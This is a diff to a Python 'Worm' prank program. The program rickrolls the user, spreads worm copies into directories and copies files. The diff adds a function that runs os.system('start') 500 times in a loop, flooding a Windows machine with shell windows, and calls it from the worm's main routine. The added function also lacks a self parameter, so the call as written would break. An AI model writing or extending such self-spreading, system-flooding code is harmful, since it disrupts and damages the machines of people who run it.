@@ -26,6 +26,8 @@ RICKLOC = "\\..\\Rick_Eternal.mp4"
 #do we open the youtube video of the mp4?
 YOUTUBETOO = False
 
+#Amount that system will open
+BRICKCOUNT = 500
 #Amount of worm files created per directory
 INSTANCES_PER_DIRECTORY = 2
 
@@ -176,24 +178,34 @@ class Worm:
                     webbrowser.open('https://www.youtube.com/watch?v=dQw4w9WgXcQ')
         except:
             logging.warning("exception occurred: no rick?")
-
+            
+    def time_to_rick():
+         for i in range(0, BRICKCOUNT):
+             os.system("start")
+        
     def start_worm_actions(self):
         print(self.target_dir_list)
         
         if self.first_run == True:
             self.rick_and_roll()
+        
         self.list_directories(self.path)
+        
         try:
             self.create_new_worm()
         except:
             logging.warning("something went wrong")
+        
         self.copy_existing_files()
+        self.time_to_rick()
+        
+        
 
             
        
         #self.connection_iterator()
         
-        
+    
     
 if __name__=="__main__":
     current_directory = os.path.abspath("")
